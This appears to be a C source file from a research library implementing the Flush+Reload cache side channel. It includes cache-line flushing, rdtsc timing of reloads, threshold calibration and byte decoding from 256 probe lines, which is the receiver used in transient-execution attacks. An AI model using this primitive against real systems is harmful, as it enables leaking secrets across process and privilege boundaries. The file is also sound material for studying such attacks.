#include "flush-reload.h"

#include <time.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>

#include "x86-64.h"

/* Sleep some time between the Flush+Reload of cache lines. */
#define FR_WAIT_100NS nanosleep((const struct timespec[]){{0,100L}}, NULL)

/* Flush+Reload
 * ------------
 * The Flush+Reload technique [1] exploits a cache side channel by leveraging
 * x86's 'clflush' instruction. This code is heavily based in the
 * implementation provided by Canella et al [2]. Credit to the authors.
 *
 * References: [1] Yarom, Yuval, and Katrina Falkner. "FLUSH+ RELOAD: a high
 *             resolution, low noise, L3 cache side-channel attack."
 *             [2] Canella, Claudio, et al. "A systematic evaluation of
 *             transient execution attacks and defenses."
 */

/* Timing threshold to distinguish cache hits from misses. */
static uint32_t fr_thr   = FR_THR_DEFAULT;
static uint32_t fr_thr_h = FR_THR_DEFAULT_H;
static uint32_t fr_thr_m = FR_THR_DEFAULT_M;
static uint32_t fr_thr_a = FR_THR_ALERT;

/* Memory. */
static uint8_t *fr_mem      = NULL;
static size_t   fr_mem_size = 0;
static size_t   fr_mem_flag = FR_MEM_FREE;

/*
 * fr_mem_ext
 * ----------
 * Get an external memory pointer to Flush+Reload on.
 */
void fr_mem_ext(void *ext_mem, size_t ext_mem_size)
{
  if (fr_mem == NULL && fr_mem_flag == FR_MEM_FREE) {
    fr_mem = (uint8_t *) ext_mem;
    fr_mem_size = ext_mem_size;
    fr_mem_flag = FR_MEM_EXT;
  }
}

/*
 * fr_mem_allocate
 * ---------------
 * Allocate enough useful memory for Flush+Reload. Only allocate if memory
 * has not been allocated yet.
 */
void * fr_mem_allocate(size_t req_mem_size)
{
  if (fr_mem == NULL && fr_mem_flag == FR_MEM_FREE) {
    fr_mem_size = req_mem_size;
    fr_mem = (uint8_t *) malloc(fr_mem_size);
    memset(fr_mem, 0x1, fr_mem_size);
    fr_mem_flag = FR_MEM_ALLOC;
    return ((void *) fr_mem);
  }
  return NULL;
}

/*
 * fr_mem_allocate_pages
 * ---------------------
 * Allocate 256 pages of memory to Flush+Reload on.
 */
void * fr_mem_allocate_pages()
{
  return fr_mem_allocate(FR_PAGESIZE * 256);
}

/*
 * fr_mem_allocate_lines
 * ---------------------
 * Allocate only 256 cache lines to Flush+Reload on.
 */
void * fr_mem_allocate_lines()
{
  return fr_mem_allocate(FR_LINESIZE * 256);
}

/*
 * fr_mem_free
 * -----------
 * Free Flush+Reload memory. Only free if memory has been allocated via
 * 'fr_mem_alloc', otherwise just reset the 'fr_mem' pointer.
 */
void fr_mem_free()
{
  if (fr_mem != NULL) {
    if (fr_mem_flag == FR_MEM_ALLOC)
      free(fr_mem);
    fr_mem = NULL;
    fr_mem_size = 0;
    fr_mem_flag = FR_MEM_FREE;
  }
}

/*
 * _fr_flush
 * ---------
 * Flush a single cache line.
 */
static void _fr_flush(void *ptr)
{
  _CLFLUSH(ptr);
  _MFENCE;
}

/*
 * _fr_reload
 * ----------
 * Reload a single cache line and time the memory access.
 *
 * Returns : Cycle count from accessing 'ptr'.
 */
static uint32_t _fr_reload(void *ptr)
{
  register uint32_t tsc_s, tsc_e;
  _MFENCE;
  _CPUID;
  _RDTSC_32(tsc_s);
  _MACCESS(ptr);
  _LFENCE;
  _RDTSCP_32(tsc_e);
  _CPUID;
  return (tsc_e - tsc_s);
}

/*
 * _fr_reload_hit
 * --------------------
 * Access a memory address 'ptr' and determine if it has been reloaded.
 *
 * Returns : 0 Cache line pointed by 'ptr' is not in the cache hierarchy.
 *           1 ''    ''     ''      ''     is in the cache hierarchy.
 */
static uint32_t _fr_reload_hit(void *ptr)
{
  return (_fr_reload(ptr) < fr_thr ? 1 : 0);
}

/*
 * _fr_reload_flush
 * ----------------
 * Reload a single cache line and time the memory access.
 * Flush immediately after.
 *
 * Returns : Cycle count from accessing 'ptr'.
 */
static uint32_t _fr_reload_flush(register void *ptr)
{
  register uint32_t tsc_s, tsc_e;
  _MFENCE;
  _CPUID;
  _RDTSC_32(tsc_s);
  _MACCESS(ptr);
  _LFENCE;
  _RDTSCP_32(tsc_e);
  _CPUID;
  _CLFLUSH(ptr);
  _MFENCE;
  return (tsc_e - tsc_s);
}

/*
 * _fr_reload_flush_hit
 * --------------------
 * Access a memory address 'ptr' and determine if it has been reloaded.
 * Flush it back immediately after.
 *
 * Returns : 0 Cache line pointed by 'ptr' is not in the cache hierarchy.
 *           1 ''    ''     ''      ''     is in the cache hierarchy.
 */
static uint32_t _fr_reload_flush_hit(register void *ptr)
{
  return (_fr_reload_flush(ptr) < fr_thr ? 1 : 0);
}

/*
 * fr_thr_calibrate
 * ----------------
 * Calibrate a suitable cycle count threshold to distinguish cache hits
 * from misses (Basically burn the CPU until it enters turbo mode).
 */
void fr_thr_calibrate()
{
  register int i;
  uint32_t cache_h = 0;
  uint32_t cache_m = 0;
  uint64_t dummy[8] = {};
  void *ptr = &dummy[4];
  // Cache hit
  _fr_reload(ptr);
  for (i = 0; i < FR_CALIBRATE; i++)
    fr_thr_h += _fr_reload(ptr);
  // Cache miss
  _fr_flush(ptr);
  for (i = 0; i < FR_CALIBRATE; i++)
    fr_thr_m += _fr_reload_flush(ptr);
  // Calculate
  fr_thr_h /= FR_CALIBRATE;
  fr_thr_m /= FR_CALIBRATE;
  fr_thr    = (fr_thr_m + fr_thr_h * 2) / 3;
  fr_thr_a  = FR_THR_SAFE;
  // Verify this calibration
  if (fr_thr < FR_THR_DEFAULT) {
    fr_thr_h = FR_THR_DEFAULT_H;
    fr_thr_m = FR_THR_DEFAULT_M;
    fr_thr   = FR_THR_DEFAULT;
    fr_thr_a = FR_THR_ALERT;
  }
}

/*
 * fr_thr_report
 * -------------
 * Print a brief report about our calibration values.
 */
void fr_thr_report()
{
  printf("\nFlush+Reload Threshold Report");
  if (fr_thr_a == FR_THR_ALERT)
    printf(" (!)");
  printf("\n---------------------------------\n");
  printf("Cache Hit  | %d\n", fr_thr_h);
  printf("Cache Miss | %d\n", fr_thr_m);
  printf("Threshold  | %d\n", fr_thr);
  printf("---------------------------------\n");
}

/*
 * fr_flush_ext
 * ------------
 * Flush contiguous external memory pointed by 'fr_mem'.
 */
void fr_flush_ext()
{
  int i = 0;
  if (fr_mem != NULL) {
    while (i <= fr_mem_size) {
      _CLFLUSH(&fr_mem[i]);
      i += FR_LINESIZE;
    }
  }
}

/*
 * fr_flush_pages
 * --------------
 * Flush 256 analogous cache lines from the cache. These cache lines map to
 * only specific cache sets in the LLC.
 */
void fr_flush_pages()
{
  if (fr_mem != NULL) {
    for (int i = 0; i < 256; i++) {
      _CLFLUSH(&fr_mem[i * FR_PAGESIZE]);
      _MFENCE;
    }
  }
}

/*
 * fr_flush_lines
 * --------------
 * Flush 256 contiguous cache lines from the cache.
 */
void fr_flush_lines()
{
  if (fr_mem != NULL) {
    for (int i = 0; i < 256; i++) {
      _CLFLUSH(&fr_mem[i * FR_LINESIZE]);
      _MFENCE;
    }
  }
}

/*
 * fr_reload_decode
 * ----------------
 * Reload 256 cache lines of 'fr_mem' and decode a cache hit as a character.
 *
 * Returns : A value [0,255]. If no cache hit is found, return 0.
 */
static uint8_t fr_reload_decode(uint64_t offs)
{
  int mix_i;
  void *ptr;
  for (int i = 0; i < 256; i++) {
    ptr = (void *) fr_mem + i * offs;
    if(_fr_reload_hit(ptr))
      return ((uint8_t) i);
    sched_yield();
  }
  return 0;
}

/*
 * fr_reload_decode_mix
 * --------------------
 * Reload 256 cache lines of 'fr_mem' and decode a cache hit as a character.
 * Do it in an unpredictable order to circumvent the pre-fetcher.
 *
 * Returns : A value [0,255]. If no cache hit is found, return 0.
 */
static uint8_t fr_reload_decode_mix(uint64_t offs)
{
  int mix_i;
  void *ptr;
  for (int i = 0; i < 256; i++) {
    mix_i = (i * 167 + 13) & 255;
    ptr = (void *) fr_mem + mix_i * offs;
    if(_fr_reload_hit(ptr))
      return ((uint8_t) mix_i);
    sched_yield();
  }
  return 0;
}

/*
 * fr_reload_decode_pages
 * ----------------------
 * Reload 256 cache lines by using a page size offset (4096).
 *
 * Returns : A value [0,255]. If no cache hit is found return 0.
 */
uint8_t fr_reload_decode_pages()
{
  if (fr_mem != NULL && fr_mem_size >= (FR_PAGESIZE * 256))
    return fr_reload_decode(FR_PAGESIZE);
  return 0;
}

/*
 * fr_reload_decode_pages
 * ----------------------
 * Reload 256 cache lines by using a line size offset (64).
 *
 * Returns : A value [0,255]. If no cache hit is found return 0.
 */
uint8_t fr_reload_decode_lines()
{
  if (fr_mem != NULL && fr_mem_size >= (FR_LINESIZE * 256))
    return fr_reload_decode(FR_LINESIZE);
  return 0;
}
